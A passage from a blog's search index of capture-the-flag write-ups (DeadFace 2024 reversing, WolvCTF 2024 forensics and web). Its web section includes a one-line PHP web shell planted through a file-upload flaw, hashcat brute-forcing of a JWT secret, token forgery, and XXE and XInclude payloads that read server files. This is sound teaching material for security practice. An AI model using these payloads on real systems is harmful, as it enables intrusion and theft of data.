different.\tHi, Barry. Artie, growing\ta mustache? Looks good. Hear about Frankie?\tYeah.\tYou going to the\tfuneral?\tNo, I\u0026#39;m\tnot going. Everybody knows, sting someone, you die.\tDon\u0026#39;t\twaste it on\ta\tsquirrel. Such\ta hothead. I guess he could have\tjust gotten\tout\tof\tthe\tway.\tI love\tthis incorporating an amusement park into our day.\tThat\u0026#39;s\twhy we don\u0026#39;t need\tvacations. Boy,\tquite a bit of pomp under the circumstances.\tWell,\tAdam, today\twe are\tmen. We\tare! Bee-men. Amen! Hallelujah! Students, faculty, distinguished\tbees, please\twelcome\tDean\tBuzzwell.\tWelcome,\tNew Hive\tCity graduating class of 9:15. That concludes\tour\tceremonies And begins your\tcareer\tat Honex\tIndustries! Will we pick our job today? I\theard\tit\u0026#39;s just orientation. Heads up! Here\twe go. Keep your hands and antennas inside\tthe\ttram at all times. Wonder what\tit\u0026#39;ll be like? A little scary. Welcome\tto\tHonex, a\tdivision\tof Honesco and a\tpart of the Hexagon Group. This is\tit!\tWow.\tWow.\tWe\tknow that\tyou, as\ta bee, have worked your whole life\u0026#34;\u0026#34;\u0026#34; # Your full text here analyze_spaces(text) def decode_binary_pattern(lines): # Extract only the meaningful binary patterns (skip the single \u0026#34;1\u0026#34; lines) patterns = [line.split(\u0026#39;:\u0026#39;)[-1].strip() for line in lines if \u0026#34;Binary pattern\u0026#34; in line and line.split(\u0026#39;:\u0026#39;)[-1].strip() != \u0026#39;1\u0026#39;] # Convert each binary pattern to decimal/ASCII decoded = \u0026#34;\u0026#34; for pattern in patterns: if pattern: # Skip empty patterns try: # Convert binary to decimal decimal = int(pattern, 2) # Convert decimal to character char = chr(decimal) decoded += char except: continue return decoded test_lines = [ \u0026#34;Binary pattern: 0001010101\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001000100\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001000011\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001010100\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001000110\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001111011\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001110111\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001101000\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000000110001\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001110100\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000000110011\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001110011\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001110000\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000000110100\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001100011\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000000110011\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001011111\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000000110001\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000000110101\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001011111\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001100011\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000000110000\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000000110000\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001101100\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 000001111101\u0026#34;, \u0026#34;Binary pattern: 1\u0026#34;, \u0026#34;Binary pattern: 00\u0026#34;, \u0026#34;Binary pattern: \u0026#34;, \u0026#34;Binary pattern: \u0026#34; ] result = decode_binary_pattern(test_lines) print(\u0026#34;Decoded message:\u0026#34;, result) ","date":"November 10, 2024","externalUrl":null,"permalink":"/posts/2024-11-10-bluehensctf2024/","section":"Posts","summary":"\u003ch1 class=\"relative group\"\u003eXS2: Looper - xor school\n    \u003cdiv id=\"xs2-looper---xor-school\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"text-primary-300 dark:text-neutral-700 !no-underline\" href=\"#xs2-looper---xor-school\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e\n    \n\u003c/h1\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg\n    class=\"my-0 rounded-md\"\n    loading=\"lazy\"\n    decoding=\"async\"\n    fetchpriority=\"low\"\n    alt=\"image\"\n    src=\"https://gist.github.com/user-attachments/assets/1108c710-b744-4ced-ae6b-3edf7aa1681b\"\n    \u003e\u003c/figure\u003e\n\u003c/p\u003e\n\n\u003ch3 class=\"relative group\"\u003eGet Part of the XOR Key\n    \u003cdiv id=\"get-part-of-the-xor-key\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"text-primary-300 dark:text-neutral-700 !no-underline\" href=\"#get-part-of-the-xor-key\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e\n    \n\u003c/h3\u003e\n\u003cp\u003eTo kick things off, We leveraged the magic of knowing the flag format udctf{. XORing this snippet against the start of the ciphertext started to reveal a familiar, cheeky pattern in CTFs: \u003ccode\u003edeadbe\u003c/code\u003e. At this point, the puzzle pieces were coming together.\u003c/p\u003e","title":"Bluehens 2024 CTF","type":"posts"},{"content":"","date":"November 10, 2024","externalUrl":null,"permalink":"/categories/crypto/","section":"Categories","summary":"","title":"Crypto","type":"categories"},{"content":"","date":"November 10, 2024","externalUrl":null,"permalink":"/categories/misc/","section":"Categories","summary":"","title":"Misc","type":"categories"},{"content":"","date":"October 28, 2024","externalUrl":null,"permalink":"/tags/deadface/","section":"Tags","summary":"","title":"Deadface","type":"tags"},{"content":"This is a writeup for DeadFace ctf 2024\nReverse Engineering # Cereal Killer 01 # We are given a binary and an executable file. Running the executable we are prompted for a password I loaded up the binary file in IDA Pro and looked at the strings maybe the password is hardcoded lets see! The string obboreel stands out trying it out as the password and it was not the password. I did spin up x64dbg to debug the file and set a breakpoint before the jump of printing the bad message Access Denied.\nAfter\nThe input is being reversed the word booberry looking up the word its a cereal and trying it out it was definetly the password and we get the flag!\nCereal Killer 02 # Running the binary gave me the cryptic message, “Please enter the password.” Challenge accepted. I tossed this bad boy into IDA Pro, and right away, I zeroed in on the function sub_13DC. The name didn’t scream “password handler,” but it was clearly doing something important. A few strings in the output hinted it might be a password validation function, so let’s crack it wide open.\nsub_13DC – The Password Sieve # So, we’ve got a big ol\u0026rsquo; pile of variables in here—s, s1, s2, and some more arrays. This is where the binary initializes everything, probably hashing or messing with the password input in some convoluted way. Here’s the fun part:\nThe Password Prompt: The function prompts for the password, which gets shoved into inputpassword. Right after, a string of mysterious sub-functions start grinding away at the input. This was a clear invitation to reverse engineer each one.\nBreaking Down the Mystery Functions: First up, sub_132F. This function takes a string like \u0026quot;976e86dafec99d2da69bbaa762aba8cc\u0026quot; and stores some hashed result into s2. It was hashing hardcoded strings, which meant the binary was expecting something specific to pass that check\nSo, after finding the password yellowschoolbus using the hash 104e5dc03561ebf96acf9a0b2b5f184f online, I confidently punched it into the binary. But guess what? It didn’t work! Classic case of getting your hopes up, right?\nThen I spotted that sneaky second hash, 976e86dafec99d2da69bbaa762aba8cc. I knew that one was going to need some serious firepower, likely requiring Hashcat to crack it.\nInstead, I opted to patch the program. I mean, who wouldn’t choose a shortcut when the end goal is just a patch away? So, I skipped the hassle of cracking that second hash, and just like that, I was ready to snag the flag without any fuss! To really wrap things up, I decided to NOP (No Operation) the JNE instruction in the binary.\nCereal Killer 03 # We’ve conquered the 250-point challenges, and now it\u0026rsquo;s time to gear up for the big leagues as we tackle the 500-point ones!\nWhen analyzing the pseudocode we see the password is being hashed inspecting the memory layout I did set a breakpoint before jump is taken the cmp eax, [ecx] synchronizing the ecx variable with the hex view we can see our input password stephen is md5 hashed 7F F3 67 97 53 91 30 F7 74 45 F4 8D A5 D4 A1 26\nThe correct password being saved in the edx register I synchronized it as well and it sits on top of the ecx register EC C8 8B 0A F9 02 53 E8 70 06 97 4B 2F 3F DC I did assemble the edx bytes to the ecx to make a match for the comparison to pass\nRunning the executable after setting a breakpoint before retn to get the flag Cereal Killer 04 # Running the binary we see Access Violation occurred. Ahem seems like its trying to access a memory location that is not valid. Upon inspecting the strings and the source code we see the Windows API functions like VirtualAlloc and VirtualProtect\nWe see the program accesses an invalid memory location 2BAD2BAD I did set an ip to another instruction from the call accessing the invalid memory location We see the program tries again to access an invalid memory location DEADFACE I did set an ip to another instruction from the call accessing the invalid memory location running the executable it terminated. I did inspect the last call to the invalid memory location DEADFACE by stepping into it\nWe see as highlighted below the invalid memory address being saved to eax and a jmp being made to it causing an access violation error. I did set an ip after the jmp instruction The executable loads dll's and loads an audio from a remote server and plays it reading the flag out loud! We are given a jar file running it we see it requires a password 1. Decompiling\nFirst, I opened the JAR file in jadx-gui and found the XOR function used to decrypt a URL. Here\u0026rsquo;s the relevant function:\nprivate static byte[] decryptURL(byte[] bArr, String str) { byte[] bArr2 = new byte[bArr.length]; for (int i = 0; i \u0026lt; bArr.length; i++) { bArr2[i] = (byte) (bArr[i] ^ str.charAt(i % str.length())); } return bArr2; } The XOR function loops through encryptedURL, applying a password in a repeating cycle.\nThe challenge required us to decrypt an encrypted URL using a password. While the password wasn’t explicitly stated, the decryption function provided a key insight: it checks if the decrypted URL starts with \u0026quot;https.\u0026quot; This led me to deduce that the password itself might be derived from the string format of the URL. Given that \u0026ldquo;https\u0026rdquo; is a common prefix for secure web addresses, it became a logical choice for the password to successfully decrypt the byte array.\nBy using \u0026ldquo;https\u0026rdquo; as the key, we were able to reverse the XOR operation, revealing the full URL.. Since XOR is a reversible operation, I crafted a quick Python script to perform the decryption:\nencrypted_url = [42, 6, 68, 64, 7, 120, 93, 31, 83, 17, 48, 23, 81, 92, 90, 46, 11, 68, 68, 27, 44, 30, 81, 82, 7, 108, 29, 66, 87, 91, 33, 23, 66, 85, 21, 46, 1, 31, 86, 6, 45, 29, 68, 82, 6, 45, 29, 68, 30, 30, 50, 23, 87] Known plaintext prefix prefix = \u0026#34;https\u0026#34; Derive key from prefix and first few bytes of encrypted_url key = [encrypted_url[i] ^ ord(prefix[i]) for i in range(len(prefix))] Extend key to match the length of encrypted_url full_key = (key * (len(encrypted_url) // len(key) + 1))[:len(encrypted_url)] Decrypt the URL decrypted_url = \u0026#39;\u0026#39;.join(chr(b ^ k) for b, k in zip(encrypted_url, full_key)) print(\u0026#34;Derived Password (Key):\u0026#34;, \u0026#39;\u0026#39;.join(chr(k) for k in key)) print(\u0026#34;Decrypted URL:\u0026#34;, decrypted_url) ","date":"October 28, 2024","externalUrl":null,"permalink":"/posts/2024-10-28-deadfacectf2024/","section":"Posts","summary":"\u003cp\u003eThis is a writeup for  DeadFace ctf 2024\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg\n    class=\"my-0 rounded-md\"\n    loading=\"lazy\"\n    decoding=\"async\"\n    fetchpriority=\"low\"\n    alt=\"pic1.png\"\n    src=\"/assets/posts/deadface2024/pic1.png\"\n    \u003e\u003c/figure\u003e\n\u003c/p\u003e\n\n\u003ch2 class=\"relative group\"\u003eReverse Engineering\n    \u003cdiv id=\"reverse-engineering\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"text-primary-300 dark:text-neutral-700 !no-underline\" href=\"#reverse-engineering\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e\n    \n\u003c/h2\u003e\n\n\u003ch2 class=\"relative group\"\u003eCereal Killer 01\n    \u003cdiv id=\"cereal-killer-01\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"text-primary-300 dark:text-neutral-700 !no-underline\" href=\"#cereal-killer-01\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e\n    \n\u003c/h2\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg\n    class=\"my-0 rounded-md\"\n    loading=\"lazy\"\n    decoding=\"async\"\n    fetchpriority=\"low\"\n    alt=\"pic1.png\"\n    src=\"/assets/posts/deadface2024/pic2.png\"\n    \u003e\u003c/figure\u003e\n\u003c/p\u003e","title":"Deadface 2024 CTF","type":"posts"},{"content":"","date":"October 28, 2024","externalUrl":null,"permalink":"/tags/forensics/","section":"Tags","summary":"","title":"Forensics","type":"tags"},{"content":"","date":"March 20, 2024","externalUrl":null,"permalink":"/tags/beginner/","section":"Tags","summary":"","title":"Beginner","type":"tags"},{"content":"","date":"March 20, 2024","externalUrl":null,"permalink":"/tags/osint/","section":"Tags","summary":"","title":"Osint","type":"tags"},{"content":"","date":"March 20, 2024","externalUrl":null,"permalink":"/tags/wolv/","section":"Tags","summary":"","title":"Wolv","type":"tags"},{"content":"This is a writeup for , forensics and web challenges from WolvCTF 2024\nForensics: Hidden Data [Beginner] # Question: WOLPHV sent me this file. Not sure what to comment about it\nFlag: wctf{h1dd3n_d4t4_n0T_s0_h1dD3N}\nWe are given an image of the CTF logo. Just use Aperi\u0026rsquo;Solve and the flag can be found within its data.\nWEB: Upload Fun # Description: I made a website where you can upload files.\nWe are given a url on visting it we get php code.\nWe notice we can make POST and GET requests to the server. It seems we are restricted to files with .. in thier filename. We notice also the filename is uploaded to the server with a random 256 hash which we cannot guess outright.\nWe can upload a file name with the maximum number of characters to trigger an error and potentially leak the hash of the file. MAXIMUM NUMBER OF CHARACTERS OF A FILENAME IS 255\n\u0026lt;?php if($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] == \u0026#34;POST\u0026#34;){ if ($_FILES[\u0026#34;f\u0026#34;][\u0026#34;size\u0026#34;] \u0026gt; 1000) { echo \u0026#34;file too large\u0026#34;; return; } if (str_contains($_FILES[\u0026#34;f\u0026#34;][\u0026#34;name\u0026#34;], \u0026#34;..\u0026#34;)) { echo \u0026#34;no .. in filename please\u0026#34;; return; } if (empty($_FILES[\u0026#34;f\u0026#34;])){ echo \u0026#34;empty file\u0026#34;; return; } $ip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; $flag = file_get_contents(\u0026#34;/flag.txt\u0026#34;); $hash = hash(\u0026#39;sha256\u0026#39;, $flag . $ip); if (move_uploaded_file($_FILES[\u0026#34;f\u0026#34;][\u0026#34;tmp_name\u0026#34;], \u0026#34;./uploads/\u0026#34; . $hash . \u0026#34;_\u0026#34; . $_FILES[\u0026#34;f\u0026#34;][\u0026#34;name\u0026#34;])) { echo \u0026#34;upload success\u0026#34;; } else { echo \u0026#34;upload error\u0026#34;; } } else { if (isset($_GET[\u0026#34;f\u0026#34;])) { $path = \u0026#34;./uploads/\u0026#34; . $_GET[\u0026#34;f\u0026#34;]; if (str_contains($path, \u0026#34;..\u0026#34;)) { echo \u0026#34;no .. in f please\u0026#34;; return; } include $path; } highlight_file(\u0026#34;index.php\u0026#34;); } ?\u0026gt; I crafted a payload in burpsuite for POST request to the server\nWe get the leaked hash in the response\nTesting if we can execute php codes Yes we can\nWe can now proceed and craft a parameter to execute our commands and upload it to our server\n\u0026lt;?php system($_GET[\u0026quot;some\u0026quot;]); ?\u0026gt; Making a request to the server through our some parameter Flag: wctf{h0w_d1d_y0u_gu355_th3_f1l3n4me?_7523015134}\nWEB: Username # When you go to the challenge page, you are prompted to register your username\nHere is the source:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Register\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;h1\u0026gt;Please register your username:\u0026lt;/h1\u0026gt; \u0026lt;form action=\u0026#34;/register\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;application/x-www-form-urlencoded\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34;/\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/html\u0026gt; Submitting the form causes the following request/response:\nRequest\nPOST /register HTTP/2 Host: username-okntin33tq-ul.a.run.app User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 12 Origin: https://username-okntin33tq-ul.a.run.app Referer: https://username-okntin33tq-ul.a.run.app/ Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers username=sam Response\nHTTP/2 302 Found Content-Type: text/html; charset=utf-8 Set-Cookie: appdata=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPGRhdGE-PHVzZXJuYW1lPnNhbTwvdXNlcm5hbWU-PC9kYXRhPiJ9.bo6oHNQHDYUNg4wOgLsd7Ey2aKsNUPopUuDmagLpCEU; Path=/ Location: /welcome X-Cloud-Trace-Context: 43f8eebd7a72b2c81f0ead9c4ac2c554;o=1 Date: Sun, 17 Mar 2024 18:19:15 GMT Server: Google Frontend Content-Length: 9 Alt-Svc: h3=\u0026#34;:443\u0026#34;; ma=2592000,h3-29=\u0026#34;:443\u0026#34;; ma=2592000 hello sam Notice two things here:\nan appdata cookie is set\nthis is a 302 (redirect) response redirecting to /welcome\nThe browser then jumps to the /welcome resource which has this request/response:\n/welcome Request\nGET /welcome HTTP/2 Host: username-okntin33tq-ul.a.run.app Cookie: appdata=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPGRhdGE-PHVzZXJuYW1lPnNhbTwvdXNlcm5hbWU-PC9kYXRhPiJ9.bo6oHNQHDYUNg4wOgLsd7Ey2aKsNUPopUuDmagLpCEU User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: https://username-okntin33tq-ul.a.run.app/ Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers /welcome Response\nHTTP/2 200 OK Content-Type: text/html; charset=utf-8 X-Cloud-Trace-Context: 5959be2418e677ee744754ce01280cb0 Date: Sun, 17 Mar 2024 18:19:15 GMT Server: Google Frontend Content-Length: 146 Alt-Svc: h3=\u0026#34;:443\u0026#34;; ma=2592000,h3-29=\u0026#34;:443\u0026#34;; ma=2592000 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;h1\u0026gt;Welcome\u0026lt;/h1\u0026gt; \u0026lt;div\u0026gt;Welcome sam\u0026lt;/div\u0026gt; \u0026lt;!-- TODO: Decide if /app/app.py is ok to use --\u0026gt; \u0026lt;/html\u0026gt; Notice\nthe cookie (as expected) is sent to the /welcome resource.\nthe registered name appears in the page response\nthere is an HTML comment about /app/app.py\nNote: It turns out there is an /app/app.py on the server and our goal is to eventually read the contents of that file somehow.\nJWT Analysis # Those with more web experience will immediately notice the cookie as a JWT (JSON Web Token).\nThere are all kinds of resources online to learn more about JWTs.\nA dead giveaway is:\nit has three islands of text separated by two periods\nfirst two islands starts with eyJ\nA great place to decode a JWT is at jwt.io\nWhen you paste the JWT into jwt.io, you\u0026rsquo;ll see something like this:\nThe HEADER on the right is just telling you:\nthe signing algorithm is HS256\nit really is a JWT (although this \u0026ldquo;typ\u0026rdquo; is optional according to the spec)\nThis is decoded from the base64 red text on the left:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 Note: By design, JWTs never include any trailing =\u0026rsquo;s like you often see as padding characters in base64.\nThe PAYLOAD is always JSON. The PAYLOAD is not encrypted by design. (so never put anything secret inside it)\nIn the language of JWTs, this PAYLOAD has one \u0026ldquo;claim\u0026rdquo;:\ndata: \u0026lt;data\u0026gt;\u0026lt;username\u0026gt;sam\u0026lt;/username\u0026gt;\u0026lt;/data\u0026gt; You can see that the data field is really just a small snippet of XML with \u0026ldquo;sam\u0026rdquo; insise the username element.\nThis is decoded from the purple base64 text on the left:\neyJkYXRhIjoiPGRhdGE-PHVzZXJuYW1lPnNhbTwvdXNlcm5hbWU-PC9kYXRhPiJ9 The last section is the SIGNATURE.\nThe signature is the aqua text on the left:\nbo6oHNQHDYUNg4wOgLsd7Ey2aKsNUPopUuDmagLpCEU This is also base64 but it decodes into binary so you can\u0026rsquo;t read it on the right.\njwt.io provides a box on the lower right where, if you know the signing secret then you can enter it.\nThe idea behind a JWT is there there is some secret that is used to cryptographically create a signature from the HEADER/PAYLOAD. That way, if someone tries to send your website and altered JWT (by hand-editing the PAYLOAD), then they won\u0026rsquo;t know the secret and so the signature they send won\u0026rsquo;t \u0026ldquo;match\u0026rdquo; the HEADER/PAYLOAD and your server can reject it.\nCracking JWTs # If you don\u0026rsquo;t know the secret, but want to find it out anyway, then you have to \u0026ldquo;crack\u0026rdquo; the secret.\nThere are lots of websites that talk about JWT cracking. There are several possible approaches that all depend on the type of algorithm used to perform the signing.\nIf the algorithm is HS### (such as our HS256), then after doing some online research, there are only a few options available to try:\n\u0026ldquo;alg\u0026rdquo;: \u0026ldquo;none\u0026rdquo; - See the \u0026ldquo;Removing the signature\u0026rdquo; section here: https://debricked.com/blog/json-web-tokens/\nDictionary attack: Looking up the secret in an online word list\nBruteforce attack: try all 1 character strings, then try all 2 character strings, etc\u0026hellip;\nSee \u0026ldquo;Cracking weak shared secrets\u0026rdquo; on this page:\nhttps://infosecwriteups.com/attacks-on-json-web-token-jwt-278a49a1ad2e\nWith some experience, it is easy to try to alg/none attack here but that won\u0026rsquo;t work with this challenge.\nNext, you could try the \u0026ldquo;rockyou\u0026rdquo; word list (google it) and you\u0026rsquo;d find that doesn\u0026rsquo;t help either.\nThat leaves Brute Forcing.\nThe hint that the JWT secret was not in any word list was released a few hours after the CTF event started based on user feedback.\nThere are several tools available to help crack JWTs. Here I\u0026rsquo;m going to use hashcat.\nhashcat --potfile-disable -a 3 -m 16500 jwt.txt -O Here are the options explained:\n\u0026ndash;potfile-disable: hashcat keeps a record of cracked hashes so if you run it a second time \u0026ldquo;nothing\u0026rdquo; seems to happen. This option makes it so you can run many times in a row as if it were the \u0026ldquo;first time\u0026rdquo;\n-a 3: attack mode = brute force\n-m 16500: tells hashcat that we are trying to crack a JWT\n- If you didn\u0026rsquo;t know this, run hashcat --help and it will list the 8 million formats it supports\njwt.txt: the local file containing the full JWT (that you pasted into jwt.io)\n-O: optimize (honestly not sure if this actually makes it go faster in practice)\nRunning this will cause a bunch of stuff to scroll by. If it succeeds, you\u0026rsquo;ll see the last bit of text output will look like this:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPGRhdGE-PHVzZXJuYW1lPnNhbTwvdXNlcm5hbWU-PC9kYXRhPiJ9.bo6oHNQHDYUNg4wOgLsd7Ey2aKsNUPopUuDmagLpCEU:mstzt Session..........: hashcat Status...........: Cracked Hash.Mode........: 16500 (JWT (JSON Web Token)) Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPG...gLpCEU Time.Started.....: Sun Mar 17 15:12:24 2024 (7 secs) Time.Estimated...: Sun Mar 17 15:12:31 2024 (0 secs) Kernel.Feature...: Pure Kernel Guess.Mask.......: ?1?2?2?2?2 [5] Guess.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined Guess.Queue......: 5/15 (33.33%) Speed.#3.........: 4888.1 kH/s (6.32ms) @ Accel:64 Loops:31 Thr:1 Vec:4 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 36029440/104136192 (34.60%) Rejected.........: 0/36029440 (0.00%) Restore.Point....: 580608/1679616 (34.57%) Restore.Sub.#3...: Salt:0 Amplifier:0-31 Iteration:0-31 Candidate.Engine.: Device Generator Candidates.#3....: saruk -\u0026gt; 7m3j0 Hardware.Mon.SMC.: Fan0: 33%, Fan1: 33% Hardware.Mon.#3..: Temp: 58c Started: Sun Mar 17 15:12:18 2024 Stopped: Sun Mar 17 15:12:32 2024 You can see it took about 14 seconds.\nYou might be wondering WHERE is the secret that it found?\nIt really is not obvious in this output.\nNotice the mstzt to the right of the token in the first line of the above output?\nThat is the HS256 secret!\nNote: In practice, I personally do try brute forcing on JWTs after first trying alg/none and rockyou.txt. I tend to let it run at most 20 minutes figuring the author wouldn\u0026rsquo;t want me to spend any more time than that. I understand others might have a different perspective here. This is why the hint was added.\nXML Injection # Now that we know the secret, we can use jwt.io or write python code to generate forged tokens with any PAYLOAD we like.\nAs an example, here I replaced \u0026ldquo;sam\u0026rdquo; with \u0026ldquo;jane\u0026rdquo; after putting the secret into the lower-right box.\nNote: Be sure to clear out the EXISTING text in the lower-right window before you paste in the secret.\nIf you take the forged token on the left and overwrite your existing cookie with this new value, then /welcome will say \u0026ldquo;Welcome jane\u0026rdquo;\nOf course, this doesn\u0026rsquo;t help us.\nThe experienced contestant will piece together the following facts:\nwe are trying to read /app/app.py from the server\nwe have the ability to send XML of our choosing to the server and PART of that XML content is echoed back to us\nand reasonably consider the following:\nXXE (XML External Entity) attack\nSSTI (Server Side Template Injection)\nThere are lots of resources online to learn more about these attacks.\nIf you try SSTI, you will see it does not help.\nIf you try XXE, here is one resource:\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection\nYou might try XML like the following:\nNote: You can use python\u0026rsquo;s json module to format the xml payload to JSON string\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE data [ \u0026lt;!ENTITY file SYSTEM \u0026#34;file:///app/app.py\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;data\u0026gt;\u0026lt;username\u0026gt;\u0026amp;file;\u0026lt;/username\u0026gt;\u0026lt;/data\u0026gt; If we make this all one line and deal with quoting escaping, here is what a jwt.io PAYLOAD might look like:\n{ \u0026#34;data\u0026#34;: \u0026#34;\u0026lt;?xml version=\\\u0026#34;1.0\\\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE data [\u0026lt;!ENTITY file SYSTEM \\\u0026#34;file:///app/app.py\\\u0026#34;\u0026gt;]\u0026gt;\u0026lt;data\u0026gt;\u0026lt;username\u0026gt;\u0026amp;file;\u0026lt;/username\u0026gt;\u0026lt;/data\u0026gt;\u0026#34; } This produces a JWT like:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPD94bWwgdmVyc2lvbj1cIjEuMFwiPz48IURPQ1RZUEUgZGF0YSBbPCFFTlRJVFkgZmlsZSBTWVNURU0gXCJmaWxlOi8vL2FwcC9hcHAucHlcIj5dPjxkYXRhPjx1c2VybmFtZT4mZmlsZTs8L3VzZXJuYW1lPjwvZGF0YT4ifQ.A_oxB1nuypCU7nDlHWjlfiBme9Aqvq7kSzsi91cSZFk If we try this as our cookie value we get this: (here I\u0026rsquo;m using Burp\u0026rsquo;s Repeater functionality)\nIt is telling us that entity references (like the \u0026amp;file;) are not allowed.\nIf we knew XML even better and tried to use something called \u0026ldquo;Parameter Entity\u0026rdquo; which start with a % symbol, we\u0026rsquo;d find those are not allowed either.\nSo\u0026hellip; what do to???\nIn the same XXE link above, there is a section labeled: XInclude attacks\nIt turns out this is an alternative approach when XML entities are not allowed. Or\u0026hellip; sometimes XML entities are allowed BUT they are not expanded.\nTo mimic the example from this web page, let\u0026rsquo;s try the following attack (all one line)\nYou only want to include the \u0026lt;username\u0026gt; element in the XML data and remove the foo element from the original payload\n\u0026lt;data\u0026gt;\u0026lt;username\u0026gt;\u0026lt;xi:include xmlns:xi=\u0026#34;http://www.w3.org/2001/XInclude\u0026#34; parse=\u0026#34;text\u0026#34; href=\u0026#34;file:///app/app.py\u0026#34;/\u0026gt;\u0026lt;/username\u0026gt;\u0026lt;/data\u0026gt; Note: The parse=\u0026quot;text\u0026quot; is really REALLY important. It tells the XML processor to NOT try to parse the included content as XML.\nOur updated PAYLOAD will 